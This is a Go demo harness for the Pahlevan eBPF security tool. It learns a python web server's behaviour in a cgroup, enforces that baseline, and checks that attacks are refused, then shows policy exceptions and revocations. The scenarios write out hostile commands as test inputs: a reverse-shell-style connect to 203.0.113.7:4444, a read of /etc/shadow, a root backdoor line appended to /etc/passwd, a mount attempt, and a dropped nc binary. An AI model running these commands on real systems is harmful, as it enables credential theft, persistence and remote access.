// Command scenario runs a real web application under Pahlevan's data plane and
// then attacks it, so that "what does Pahlevan actually do" has an answer made
// of kernel behavior rather than of claims.
//
// It is not a test. A test asserts a property; this reports an outcome, in the
// shape an operator evaluating the tool would want to see: here is a workload,
// here is what it was observed doing, here is what happened when something it
// had never done was attempted.
//
// The whole run happens inside one cgroup, which is the unit Pahlevan governs.
// In a cluster the cgroup comes from the container runtime and the mode flip
// comes from the learning window elapsing; here both are done directly, because
// the point is to exercise the data plane, not the Kubernetes plumbing above it.
//
// Must be run as root on a kernel with the BPF LSM active. That means the VM,
// never a developer's host.
package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/obsernetics/pahlevan/internal/adaptive"
	"github.com/obsernetics/pahlevan/internal/policy"
	policyv1alpha1 "github.com/obsernetics/pahlevan/pkg/apis/policy/v1alpha1"
	"github.com/obsernetics/pahlevan/pkg/ebpf"
)

func main() {
	var (
		learn    = flag.Duration("learn", 45*time.Minute, "how long the workload runs before enforcement")
		settle   = flag.Duration("settle", 10*time.Second, "pause between enforcement and the first scenario")
		out      = flag.String("out", "pahlevan-scenario-report.md", "where to write the report")
		appPort  = flag.Int("port", 8080, "port the demo web application listens on")
		trafficN = flag.Duration("traffic-interval", 2*time.Second, "how often the client hits the app")
	)
	flag.Parse()

	if os.Geteuid() != 0 {
		fatal("must run as root: loading and attaching BPF LSM programs needs privilege")
	}

	r := &run{
		started: time.Now(),
		learn:   *learn,
		port:    *appPort,
	}

	mgr, err := ebpf.NewManager()
	if err != nil {
		fatal("initializing the eBPF manager: %v", err)
	}
	defer mgr.Close()
	if err := mgr.LoadPrograms(); err != nil {
		fatal("loading eBPF programs: %v", err)
	}

	obs := &observer{}
	mgr.AddEventHandler(obs)
	// The cgroup id is filled in below, once the cgroup exists. Until then the
	// observer records nothing, which is correct: nothing has been governed yet.
	obs.cgroup = ^uint64(0)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := mgr.Start(ctx); err != nil {
		fatal("attaching the data plane: %v", err)
	}
	say("data plane attached")

	cgPath, cgID, err := makeCgroup("pahlevan-demo")
	if err != nil {
		fatal("creating the demo cgroup: %v", err)
	}
	defer func() { _ = os.Remove(cgPath) }()
	r.cgroupID = cgID
	obs.cgroup = cgID
	say("demo cgroup %s (id %d) - only this cgroup's events are recorded", cgPath, cgID)

	// The workload. A static file server is not a toy here: it reads files,
	// binds a port, accepts connections and forks nothing, which is exactly the
	// behavioral profile of the web tier Pahlevan is usually pointed at.
	app, webroot, err := startApp(cgPath, *appPort)
	if err != nil {
		fatal("starting the demo application: %v", err)
	}
	defer func() { _ = app.Process.Kill() }()
	say("web application running on :%d inside the demo cgroup", *appPort)

	// Traffic, so the learned baseline reflects a workload under load rather
	// than one that started and sat idle.
	stopTraffic := make(chan struct{})
	var trafficWG sync.WaitGroup
	trafficWG.Add(1)
	go func() { defer trafficWG.Done(); driveTraffic(*appPort, *trafficN, stopTraffic, r) }()

	say("LEARNING for %s - every syscall, file, connection, exec and capability "+
		"the workload uses is being recorded", *learn)
	deadline := time.Now().Add(*learn)
	for time.Now().Before(deadline) {
		time.Sleep(30 * time.Second)
		if time.Now().After(deadline) {
			break
		}
		// The distinct sets, not the raw event count. Every (cgroup, path) and
		// (cgroup, destination) pair is deduplicated in the kernel, so once a
		// workload has settled the event counter stops moving entirely - which
		// is the signal you want before enforcing, and which reads like a
		// hung process if all you print is a number that has stopped changing.
		snap := obs.snapshot()
		say("  learning %s elapsed, %s remaining: %d files, %d execs, %d dests, %d caps"+
			" (%d events; a flat count means the baseline has converged)",
			time.Since(r.started).Round(time.Second),
			time.Until(deadline).Round(time.Second),
			len(snap.Files), len(snap.Execs), len(snap.Dests), len(snap.Caps), snap.Events)
	}

	r.baseline = obs.snapshot()
	say("learning complete: %d events, %d distinct binaries, %d files, %d destinations, %d capabilities",
		r.baseline.Events, len(r.baseline.Execs), len(r.baseline.Files),
		len(r.baseline.Dests), len(r.baseline.Caps))

	// Enforce. From here anything absent from the learned set is refused by the
	// kernel, before it happens.
	for name, set := range map[string]func(uint64, bool) error{
		"file":       mgr.SetFileEnforcement,
		"network":    mgr.SetNetworkEnforcement,
		"exec":       mgr.SetExecEnforcement,
		"capability": mgr.SetCapabilityEnforcement,
	} {
		if err := set(cgID, true); err != nil {
			say("  warning: could not enforce %s: %v", name, err)
			r.enforceWarnings = append(r.enforceWarnings, fmt.Sprintf("%s: %v", name, err))
		}
	}
	say("ENFORCING")
	time.Sleep(*settle)

	// A process filter, so the run also shows the constraint that is about who
	// is running something rather than what is being run.
	if err := mgr.SetProcFilter(cgID, &ebpf.ProcFilter{ParentProcesses: []string{"sh"}}); err != nil {
		say("  warning: could not install the process filter: %v", err)
	}

	r.scenarios = runScenarios(cgPath, *appPort, obs)
	r.exceptions = runExceptionPhase(mgr, cgPath, cgID, *appPort, webroot, obs)

	close(stopTraffic)
	trafficWG.Wait()
	r.after = obs.snapshot()
	r.finished = time.Now()

	report := r.render()
	if err := os.WriteFile(*out, []byte(report), 0o600); err != nil {
		fatal("writing the report: %v", err)
	}
	say("report written to %s", *out)
	fmt.Print("\n" + report)
}

// --- the workload -----------------------------------------------------------

// startApp launches the demo web application inside the cgroup.
//
// The shell wrapper is how the process joins the cgroup before exec'ing: there
// is no way to ask exec.Command to place the child in a cgroup, and moving it
// afterwards would mean the exec itself was never observed.
func startApp(cgPath string, port int) (*exec.Cmd, string, error) {
	root, err := os.MkdirTemp("", "pahlevan-webroot")
	if err != nil {
		return nil, "", err
	}
	pages := map[string]string{
		"index.html":  "<h1>demo</h1>",
		"health":      "ok",
		"config.json": `{"env":"demo"}`,
	}
	for name, body := range pages {
		if err := os.WriteFile(filepath.Join(root, name), []byte(body), 0o600); err != nil {
			return nil, "", err
		}
	}
	// A nonce only this webroot contains. The readiness check below fetches it,
	// which is the difference between "something is listening on this port" and
	// "the server I just started is listening on this port".
	//
	// That distinction is not hypothetical. A previous run of this harness,
	// killed before its deferred cleanup ran, left a python server bound to the
	// same port. The next run created a fresh webroot, saw the port answer, and
	// proceeded - learning the *old* server's file reads and then revoking a
	// path in the new webroot that nothing was ever going to open. The report
	// showed a MISMATCH on a mechanism that works, which is the worst kind of
	// wrong result: it accuses the tool of a defect the harness caused.
	nonce := fmt.Sprintf("pahlevan-%d-%d", os.Getpid(), port)
	if err := os.WriteFile(filepath.Join(root, "nonce"), []byte(nonce), 0o600); err != nil {
		return nil, "", err
	}

	script := fmt.Sprintf("echo $$ > %s/cgroup.procs && exec python3 -m http.server %d --directory %s",
		cgPath, port, root)
	cmd := exec.Command("/bin/sh", "-c", script)
	cmd.Stdout, cmd.Stderr = nil, nil
	if err := cmd.Start(); err != nil {
		return nil, "", err
	}

	client := &http.Client{Timeout: 500 * time.Millisecond}
	for i := 0; i < 100; i++ {
		resp, err := client.Get(fmt.Sprintf("http://127.0.0.1:%d/nonce", port))
		if err == nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 128))
			_ = resp.Body.Close()
			if strings.TrimSpace(string(body)) == nonce {
				return cmd, root, nil
			}
			// Someone else owns the port. Say so precisely rather than
			// proceeding against a server this run does not control.
			_ = cmd.Process.Kill()
			return nil, "", fmt.Errorf(
				"port %d is already served by another process (its /nonce does not match "+
					"this run's); kill the leftover server and retry", port)
		}
		time.Sleep(100 * time.Millisecond)
	}
	_ = cmd.Process.Kill()
	return nil, "", fmt.Errorf("the application never began serving on :%d", port)
}

func driveTraffic(port int, every time.Duration, stop <-chan struct{}, r *run) {
	client := &http.Client{Timeout: 3 * time.Second}
	paths := []string{"/", "/health", "/config.json", "/index.html"}
	t := time.NewTicker(every)
	defer t.Stop()
	i := 0
	for {
		select {
		case <-stop:
			return
		case <-t.C:
			url := fmt.Sprintf("http://127.0.0.1:%d%s", port, paths[i%len(paths)])
			i++
			resp, err := client.Get(url)
			if err != nil {
				r.mu.Lock()
				r.requestErrors++
				r.mu.Unlock()
				continue
			}
			_ = resp.Body.Close()
			r.mu.Lock()
			r.requests++
			r.mu.Unlock()
		}
	}
}

// --- scenarios ---------------------------------------------------------------

// scenario is one thing an attacker (or a mistake) might do, and what happened.
type scenario struct {
	Name    string
	Story   string
	Command string
	// Expect is what should happen if enforcement is working.
	Expect  string
	Allowed bool
	Detail  string
}

// runScenarios performs each attack against the enforcing workload.
//
// Every one is a real execve, connect or open inside the governed cgroup. None
// of them consult Pahlevan's own state to decide the outcome: the result is
// whatever the kernel did.
//
// Most of the attacks go through python3 rather than through a dedicated tool,
// and that is the realistic shape rather than a convenience. Once exec
// enforcement is on, an attacker cannot introduce a new binary at all - the
// first smoke run of this harness showed every scenario being refused at the
// exec of `curl` or `cat`, before the interesting hook was ever reached. What a
// real attacker does instead is reach for the interpreter that is already in
// the image and already learned, which is exactly what these do: the exec is
// permitted, and the file, network and capability hooks are what refuse the
// action.
func runScenarios(cgPath string, port int, obs *observer) []scenario {
	inCgroup := func(shell string) (string, error) {
		script := fmt.Sprintf("echo $$ > %s/cgroup.procs && %s", cgPath, shell)
		outB, err := exec.Command("/bin/sh", "-c", script).CombinedOutput()
		text := strings.TrimSpace(string(outB))
		if len(text) > 300 {
			text = text[:300] + "..."
		}
		return text, err
	}

	// The client is deliberately outside the cgroup. Pahlevan governs what the
	// workload does, not what is done to it: a request arriving from a browser
	// is not the container executing anything, and running curl *inside* the
	// container would be an unlearned exec that is correctly refused. Conflating
	// the two is the easiest way to misread what this tool enforces.
	httpClient := &http.Client{Timeout: 3 * time.Second}
	probeApp := func() (string, error) {
		resp, err := httpClient.Get(fmt.Sprintf("http://127.0.0.1:%d/health", port))
		if err != nil {
			return "", err
		}
		defer func() { _ = resp.Body.Close() }()
		return fmt.Sprintf("HTTP %d from the application", resp.StatusCode), nil
	}

	// Staged from outside the cgroup, so the copy is not what gets refused; the
	// question is whether the workload can run them.
	_ = exec.Command("/bin/cp", "/bin/nc", "/tmp/pahlevan-dropped").Run()
	defer func() { _ = os.Remove("/tmp/pahlevan-dropped") }()
	_ = exec.Command("/bin/cp", "/bin/true", "/tmp/xmrig").Run()
	defer func() { _ = os.Remove("/tmp/xmrig") }()

	type step struct {
		name, story, cmd, expect string
		run                      func() (string, error)
	}

	py := func(code string) string {
		return fmt.Sprintf("python3 -c %s", quoteShell(code))
	}

	steps := []step{
		{
			name: "Legitimate traffic is still served",
			story: "The control, and the first thing to establish: enforcement that " +
				"also breaks the workload is not a win. The request comes from outside " +
				"the container, because that is where requests come from - Pahlevan " +
				"governs what the workload does, not what is done to it.",
			cmd: "GET /health from outside the cgroup", expect: "allowed",
			run: probeApp,
		},
		{
			name: "Reverse shell through the interpreter already in the image",
			story: "The realistic post-exploitation move. python3 is present and " +
				"learned - the application is written in it - so the exec succeeds. " +
				"The connection is what fails: a static file server has never dialed " +
				"anything, so every outbound destination is new.",
			cmd:    py("import socket;socket.create_connection(('203.0.113.7',4444),2)"),
			expect: "denied",
		},
		{
			name: "Credential theft: read /etc/shadow",
			story: "Same permitted interpreter, a file the application never opened " +
				"during the learning window.",
			cmd:    py("print(open('/etc/shadow').read()[:40])"),
			expect: "denied",
		},
		{
			name: "Persistence: append a user to /etc/passwd",
			story: "A shell redirect, so no new process is involved at all. The write " +
				"path is what is refused: a workload that read /etc/passwd at startup " +
				"does not thereby get to write it, because reads and writes are " +
				"separate entries in the allow-set.",
			cmd:    "echo 'backdoor:x:0:0::/root:/bin/sh' >> /etc/passwd",
			expect: "denied",
		},
		{
			name: "Container escape: mount(2) from the interpreter",
			story: "Needs CAP_SYS_ADMIN. Going through python3 rather than /bin/mount " +
				"means the exec is permitted and the capability hook is what refuses it.",
			cmd: py("import ctypes;libc=ctypes.CDLL('libc.so.6',use_errno=True);" +
				"r=libc.mount(b'proc',b'/mnt',b'proc',0,None);print('mount rc',r,'errno',ctypes.get_errno())"),
			expect: "denied",
		},
		{
			name: "Webshell drops and runs a binary",
			story: "The other half of the picture. Here the exec hook is the one that " +
				"fires: the binary is real and executable, and has simply never been " +
				"run by this workload.",
			cmd: "/tmp/pahlevan-dropped -h", expect: "denied",
		},
		{
			name: "Cryptominer under a plausible name",
			story: "Renaming it changes nothing. The allow-set keys on the resolved " +
				"path, not on a signature or a name list, so there is no name that " +
				"makes an unlearned binary permitted.",
			cmd: "/tmp/xmrig", expect: "denied",
		},
		{
			name:  "Shell spawned by the web server",
			story: "What a command-injection bug produces.",
			cmd:   "/bin/busybox sh -c id", expect: "denied",
		},
		{
			name: "The application itself is unaffected",
			story: "After every refusal above, the workload is asked to do the thing " +
				"it was learned doing. If enforcement degraded the application, this " +
				"is where it shows.",
			cmd: "GET /health from outside the cgroup", expect: "allowed",
			run: probeApp,
		},
	}

	var out []scenario
	for _, c := range steps {
		before := obs.denials()
		var detail string
		var err error
		if c.run != nil {
			detail, err = c.run()
		} else {
			detail, err = inCgroup(c.cmd)
		}
		time.Sleep(400 * time.Millisecond) // let the ring buffer drain
		newDenials := obs.denials() - before

		s := scenario{
			Name: c.name, Story: c.story, Command: c.cmd,
			Expect: c.expect, Allowed: err == nil,
		}
		switch {
		case err != nil && detail != "":
			s.Detail = fmt.Sprintf("%v\n%s", err, detail)
		case err != nil:
			s.Detail = err.Error()
		default:
			s.Detail = detail
		}
		// A refusal that surfaces as a Python traceback rather than a non-zero
		// exit is still a refusal; the denial counter is the ground truth.
		if err == nil && newDenials > 0 && strings.Contains(strings.ToLower(detail), "error") {
			s.Allowed = false
		}
		if newDenials > 0 {
			s.Detail += fmt.Sprintf("\n[%d in-kernel denial(s) recorded]", newDenials)
		}
		out = append(out, s)

		status := "ALLOWED"
		if !s.Allowed {
			status = "DENIED "
		}
		say("  %s  %s", status, c.name)
	}
	return out
}

// quoteShell wraps code in single quotes for /bin/sh, escaping any it contains.
func quoteShell(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// --- policy exceptions ---------------------------------------------------------

// runExceptionPhase demonstrates that an operator can correct the learned
// baseline at both edges: grant something the window missed, and revoke
// something the window caught.
//
// This is the half of the model that gets least attention and matters most in
// practice. A baseline is a summary of one observation window, so it will be
// wrong sometimes - a backup path that runs nightly, a failure handler that
// never fired. Without a way to correct it, the only options are a broken
// workload or no enforcement.
//
// The demonstration runs the real path rather than a convincing imitation:
// the policy fragment below is a genuine PahlevanPolicySpec, it goes through
// internal/policy.Translate exactly as the agent's resolver does, and the
// resulting Overrides are written by adaptive.ApplyOverrides - the same
// function the controller calls before a container flips to enforcing. A demo
// that seeded the maps directly would prove nothing about what the agent does.
func runExceptionPhase(mgr *ebpf.Manager, cgPath string, cgID uint64, port int, webroot string, obs *observer) []scenario {
	var out []scenario

	inCgroup := func(shell string) (string, error) {
		script := fmt.Sprintf("echo $$ > %s/cgroup.procs && %s", cgPath, shell)
		outB, err := exec.Command("/bin/sh", "-c", script).CombinedOutput()
		text := strings.TrimSpace(string(outB))
		if len(text) > 300 {
			text = text[:300] + "..."
		}
		return text, err
	}

	// A file a real workload plausibly needs on a code path that did not run
	// during the window. Nothing about it is special to the harness: it is
	// simply a path the application never opened.
	const missed = "/etc/ssl/certs/ca-certificates.crt"
	probe := fmt.Sprintf("python3 -c %s",
		quoteShell(fmt.Sprintf("print(len(open('%s').read()))", missed)))

	record := func(name, story, cmd, expect string) {
		before := obs.denials()
		detail, err := inCgroup(cmd)
		time.Sleep(400 * time.Millisecond)
		sc := scenario{Name: name, Story: story, Command: cmd, Expect: expect, Allowed: err == nil}
		switch {
		case err != nil && detail != "":
			sc.Detail = fmt.Sprintf("%v\n%s", err, detail)
		case err != nil:
			sc.Detail = err.Error()
		default:
			sc.Detail = detail
		}
		if n := obs.denials() - before; n > 0 {
			sc.Detail += fmt.Sprintf("\n[%d in-kernel denial(s) recorded]", n)
		}
		out = append(out, sc)
		status := "ALLOWED"
		if !sc.Allowed {
			status = "DENIED "
		}
		say("  %s  %s", status, name)
	}

	record("A legitimate path the learning window missed",
		"Before any exception. The workload has a code path that reads the "+
			"system trust store, and it did not run during the window - so the "+
			"path is not in the baseline and the read is refused. This is the "+
			"false denial every learned-baseline tool has to have an answer for.",
		probe, "denied")

	// The operator's answer, written as they would write it.
	spec := policyv1alpha1.PahlevanPolicySpec{
		EnforcementConfig: policyv1alpha1.EnforcementConfig{
			Mode: policyv1alpha1.EnforcementModeBlocking,
			Exceptions: []policyv1alpha1.EnforcementException{{
				Type:     policyv1alpha1.ExceptionTypeFile,
				Patterns: []string{missed},
				Reason:   "TLS trust store, read on a code path the learning window did not exercise",
			}},
		},
	}
	decision, warnings := policy.Translate("demo-exception", spec, time.Now())
	for _, w := range warnings {
		say("  policy warning: %s", w)
	}
	failed := adaptive.ApplyOverrides(mgr, cgID, decision.Overrides,
		func(kind, entry string, err error) {
			say("  could not seed %s %s: %v", kind, entry, err)
		})
	say("  applied the exception: %d entries failed", failed)

	record("The same read, after the exception is applied",
		"Nothing changed except the policy. The command is byte for byte the "+
			"one refused above, the container was not restarted, and enforcement "+
			"was never switched off - the entry was written into the same kernel "+
			"allow-set the learning window populates, using the same key "+
			"derivation, by the same function the controller calls.",
		probe, "allowed")

	// The other edge, and the more interesting one: revoking something the
	// window did learn. The file is one the application itself serves, so it
	// was read hundreds of times during learning and is unambiguously in the
	// allow-set - and the effect is visible from outside the container, in the
	// response the workload gives, rather than in a shell command.
	served := filepath.Join(webroot, "config.json")
	client := &http.Client{Timeout: 3 * time.Second}
	fetch := func() (string, error) {
		resp, err := client.Get(fmt.Sprintf("http://127.0.0.1:%d/config.json", port))
		if err != nil {
			return "", err
		}
		defer func() { _ = resp.Body.Close() }()
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 200))
		if resp.StatusCode != http.StatusOK {
			return fmt.Sprintf("HTTP %d", resp.StatusCode),
				fmt.Errorf("the application could not serve the file: HTTP %d", resp.StatusCode)
		}
		return fmt.Sprintf("HTTP %d  %s", resp.StatusCode, strings.TrimSpace(string(body))), nil
	}

	recordFetch := func(name, story, expect string) {
		before := obs.denials()
		detail, err := fetch()
		time.Sleep(400 * time.Millisecond)
		sc := scenario{
			Name: name, Story: story, Expect: expect, Allowed: err == nil,
			Command: fmt.Sprintf("GET /config.json  (the app reads %s)", served),
		}
		sc.Detail = detail
		if err != nil {
			sc.Detail = fmt.Sprintf("%v\n%s", err, detail)
		}
		if n := obs.denials() - before; n > 0 {
			sc.Detail += fmt.Sprintf("\n[%d in-kernel denial(s) recorded]", n)
		}
		out = append(out, sc)
		status := "ALLOWED"
		if !sc.Allowed {
			status = "DENIED "
		}
		say("  %s  %s", status, name)
	}

	recordFetch("A file the application really does serve",
		"Requested hundreds of times during the learning window, so the read is "+
			"unambiguously in the allow-set. The request comes from outside the "+
			"container; the read it causes happens inside.",
		"allowed")

	denySpec := policyv1alpha1.PahlevanPolicySpec{
		EnforcementConfig: policyv1alpha1.EnforcementConfig{Mode: policyv1alpha1.EnforcementModeBlocking},
		FilePolicy:        &policyv1alpha1.FilePolicy{DeniedPaths: []string{served}},
	}
	denyDecision, denyWarnings := policy.Translate("demo-deny", denySpec, time.Now())
	for _, w := range denyWarnings {
		say("  policy warning: %s", w)
	}
	adaptive.ApplyOverrides(mgr, cgID, denyDecision.Overrides, nil)
	say("  applied filePolicy.deniedPaths for %s", served)

	recordFetch("The same file, after deniedPaths revokes it",
		"The application can no longer read what it was serving a second ago, "+
			"and the failure is visible in its response rather than in a log. This "+
			"is the edge that matters when a learning window captured something it "+
			"should not have: a deny list removes the entry even though the "+
			"behavior was observed, so \"we saw it happen\" stops being the same "+
			"thing as \"it is permitted\".",
		"denied")

	// Put it back. Leaving a demo in a state where the workload is broken would
	// make every later reading of the report wrong about what enforcement did.
	restore := policyv1alpha1.PahlevanPolicySpec{
		EnforcementConfig: policyv1alpha1.EnforcementConfig{
			Mode: policyv1alpha1.EnforcementModeBlocking,
			Exceptions: []policyv1alpha1.EnforcementException{{
				Type: policyv1alpha1.ExceptionTypeFile, Patterns: []string{served},
				Reason: "restoring the demo's own workload",
			}},
		},
	}
	restoreDecision, _ := policy.Translate("demo-restore", restore, time.Now())
	adaptive.ApplyOverrides(mgr, cgID, restoreDecision.Overrides, nil)
	recordFetch("And restored, so the workload ends the run healthy",
		"The revocation is undone the same way it was applied. An operator who "+
			"denies the wrong path is one exception away from undoing it.",
		"allowed")

	return out
}

// --- observation --------------------------------------------------------------

type snapshot struct {
	Events  int
	Denials int
	Execs   []string
	Files   []string
	Dests   []string
	Caps    []string
	Denied  []string
}

// observer is the event handler the manager dispatches into. It is the same
// interface the agent's learner and export pipeline implement.
//
// It filters on the demo cgroup, and the first run of this harness is why.
// The data plane reports every event on the node, because that is what a
// node-wide agent is for; enforcement is per-cgroup, keyed by cgroup id, so
// the denials were right. The report was not: it listed the learned baseline
// as fwupdmgr, sysstat, iptables and k3s's ipset - the VM's own housekeeping -
// under a heading claiming to describe the web server. A baseline report that
// includes the whole node is worse than no baseline report, because it makes
// the allow-set look enormous and unfocused when the thing actually being
// enforced is a handful of paths.
type observer struct {
	// cgroup limits what is recorded to the governed container. Zero records
	// everything, which is only useful for debugging the harness itself.
	cgroup uint64

	mu       sync.Mutex
	events   int
	denied   int
	execs    map[string]int
	files    map[string]int
	dests    map[string]int
	caps     map[string]int
	denials_ []string
}

func (o *observer) init() {
	if o.execs == nil {
		o.execs = map[string]int{}
		o.files = map[string]int{}
		o.dests = map[string]int{}
		o.caps = map[string]int{}
	}
}

// mine reports whether an event belongs to the governed cgroup.
func (o *observer) mine(cgroup uint64) bool {
	return o.cgroup == 0 || cgroup == o.cgroup
}

func (o *observer) HandleSyscallEvent(e *ebpf.SyscallEvent) error {
	if !o.mine(e.CgroupID) {
		return nil
	}
	o.mu.Lock()
	defer o.mu.Unlock()
	o.events++
	return nil
}

func (o *observer) HandleProcessEvent(e *ebpf.ProcessEvent) error {
	if !o.mine(e.CgroupID) {
		return nil
	}
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	o.events++
	if e.IsExit() {
		return nil
	}
	o.execs[e.Filename]++
	if e.IsDenied() {
		o.denied++
		o.denials_ = append(o.denials_, fmt.Sprintf(
			"exec %s (%s), lineage %s", e.Filename, e.DenialReason(), e.AncestryChain()))
	}
	return nil
}

func (o *observer) HandleFileEvent(e *ebpf.FileEvent) error {
	if !o.mine(e.CgroupID) {
		return nil
	}
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	o.events++
	mode := "read"
	if e.IsWrite() {
		mode = "write"
	}
	o.files[mode+" "+e.Path]++
	if e.IsDenied() {
		o.denied++
		o.denials_ = append(o.denials_, fmt.Sprintf("file %s %s by %s", mode, e.Path, e.Comm))
	}
	return nil
}

func (o *observer) HandleNetworkEvent(e *ebpf.NetworkEvent) error {
	if !o.mine(e.CgroupID) {
		return nil
	}
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	o.events++
	dest := fmt.Sprintf("%s:%d", ebpf.IPv4String(e.DstIP), e.DstPort)
	o.dests[dest]++
	if e.Direction&ebpf.DeniedDirection != 0 {
		o.denied++
		o.denials_ = append(o.denials_, fmt.Sprintf("connect %s by %s", dest, e.Comm))
	}
	return nil
}

func (o *observer) HandleCapabilityEvent(e *ebpf.CapabilityEvent) error {
	if !o.mine(e.CgroupID) {
		return nil
	}
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	o.events++
	name := ebpf.CapabilityName(e.Capability)
	o.caps[name]++
	if e.Flags&ebpf.DeniedFlag != 0 {
		o.denied++
		o.denials_ = append(o.denials_, fmt.Sprintf("capability %s by %s", name, e.Comm))
	}
	return nil
}

func (o *observer) denials() int {
	o.mu.Lock()
	defer o.mu.Unlock()
	return o.denied
}

func (o *observer) snapshot() snapshot {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	keys := func(m map[string]int) []string {
		out := make([]string, 0, len(m))
		for k := range m {
			out = append(out, k)
		}
		sort.Strings(out)
		return out
	}
	return snapshot{
		Events: o.events, Denials: o.denied,
		Execs: keys(o.execs), Files: keys(o.files),
		Dests: keys(o.dests), Caps: keys(o.caps),
		Denied: append([]string(nil), o.denials_...),
	}
}

// --- reporting -----------------------------------------------------------------

type run struct {
	mu              sync.Mutex
	started         time.Time
	finished        time.Time
	learn           time.Duration
	port            int
	cgroupID        uint64
	requests        int
	requestErrors   int
	baseline        snapshot
	after           snapshot
	scenarios       []scenario
	exceptions      []scenario
	enforceWarnings []string
}

func (r *run) render() string {
	var b strings.Builder
	p := func(f string, a ...any) { fmt.Fprintf(&b, f+"\n", a...) }

	p("# Pahlevan on a live web application")
	p("")
	p("A static file server ran for %s under continuous traffic while Pahlevan",
		r.learn.Round(time.Second))
	p("observed it. Enforcement was then switched on and the workload was attacked.")
	p("Nothing below is asserted: each line is what the kernel did.")
	p("")
	p("| | |")
	p("|---|---|")
	p("| Started | %s |", r.started.UTC().Format(time.RFC3339))
	p("| Finished | %s |", r.finished.UTC().Format(time.RFC3339))
	p("| Total run | %s |", r.finished.Sub(r.started).Round(time.Second))
	p("| Learning window | %s |", r.learn.Round(time.Second))
	p("| Cgroup | %d |", r.cgroupID)
	p("| Requests served | %d (%d failed) |", r.requests, r.requestErrors)
	p("| Events observed | %d (this cgroup only) |", r.after.Events)
	p("")
	if len(r.enforceWarnings) > 0 {
		p("> Enforcement could not be enabled for: %s", strings.Join(r.enforceWarnings, "; "))
		p("")
	}

	p("## What it learned")
	p("")
	p("This is the whole policy. Nobody wrote it, and it covers only the governed")
	p("cgroup - the data plane sees the whole node, but enforcement and this report")
	p("are scoped to the container.")
	p("")
	p("**Binaries executed (%d)**", len(r.baseline.Execs))
	p("")
	for _, e := range r.baseline.Execs {
		p("- `%s`", e)
	}
	p("")
	p("**Files touched (%d)**", len(r.baseline.Files))
	p("")
	for _, f := range limit(r.baseline.Files, 25) {
		p("- `%s`", f)
	}
	p("")
	p("**Network destinations (%d)**", len(r.baseline.Dests))
	p("")
	for _, d := range r.baseline.Dests {
		p("- `%s`", d)
	}
	p("")
	p("**Capabilities used (%d)**", len(r.baseline.Caps))
	p("")
	for _, c := range r.baseline.Caps {
		p("- `%s`", c)
	}
	p("")

	p("## What happened when it was attacked")
	p("")
	p("| Scenario | Expected | Result |")
	p("|---|---|---|")
	for _, s := range r.scenarios {
		got := "denied"
		if s.Allowed {
			got = "allowed"
		}
		mark := "MATCH"
		if got != s.Expect {
			mark = "**MISMATCH**"
		}
		p("| %s | %s | %s (%s) |", s.Name, s.Expect, got, mark)
	}
	p("")
	for _, s := range r.scenarios {
		p("### %s", s.Name)
		p("")
		p("%s", s.Story)
		p("")
		p("```")
		p("$ %s", s.Command)
		p("%s", s.Detail)
		p("```")
		p("")
	}

	if len(r.exceptions) > 0 {
		p("## Correcting the baseline")
		p("")
		p("A baseline is a summary of one observation window, so it will sometimes be")
		p("wrong. Without a way to correct it the only options are a broken workload or")
		p("no enforcement, which is why this half of the model matters as much as the")
		p("learning does.")
		p("")
		p("Everything below went through the real path: a PahlevanPolicySpec, through")
		p("internal/policy.Translate, applied by adaptive.ApplyOverrides - the same")
		p("function the controller calls before a container flips to enforcing.")
		p("")
		p("| Step | Expected | Result |")
		p("|---|---|---|")
		for _, s := range r.exceptions {
			got := "denied"
			if s.Allowed {
				got = "allowed"
			}
			mark := "MATCH"
			if got != s.Expect {
				mark = "**MISMATCH**"
			}
			p("| %s | %s | %s (%s) |", s.Name, s.Expect, got, mark)
		}
		p("")
		for _, s := range r.exceptions {
			p("### %s", s.Name)
			p("")
			p("%s", s.Story)
			p("")
			p("```")
			p("$ %s", s.Command)
			p("%s", s.Detail)
			p("```")
			p("")
		}
	}

	p("## In-kernel denials recorded")
	p("")
	if len(r.after.Denied) == 0 {
		p("None.")
	}
	for _, d := range r.after.Denied {
		p("- %s", d)
	}
	p("")
	return b.String()
}

func limit(s []string, n int) []string {
	if len(s) <= n {
		return s
	}
	out := append([]string(nil), s[:n]...)
	return append(out, fmt.Sprintf("... and %d more", len(s)-n))
}

// --- plumbing -------------------------------------------------------------------

func makeCgroup(name string) (string, uint64, error) {
	const cgroupRoot = "/sys/fs/cgroup"
	path := filepath.Join(cgroupRoot, name)
	if err := os.Mkdir(path, 0o755); err != nil && !os.IsExist(err) {
		return "", 0, err
	}
	var st syscall.Stat_t
	if err := syscall.Stat(path, &st); err != nil {
		return "", 0, err
	}
	return path, st.Ino, nil
}

func say(f string, a ...any) {
	fmt.Printf("[%s] %s\n", time.Now().Format("15:04:05"), fmt.Sprintf(f, a...))
}

func fatal(f string, a ...any) {
	fmt.Fprintf(os.Stderr, "scenario: %s\n", fmt.Sprintf(f, a...))
	os.Exit(1)
}
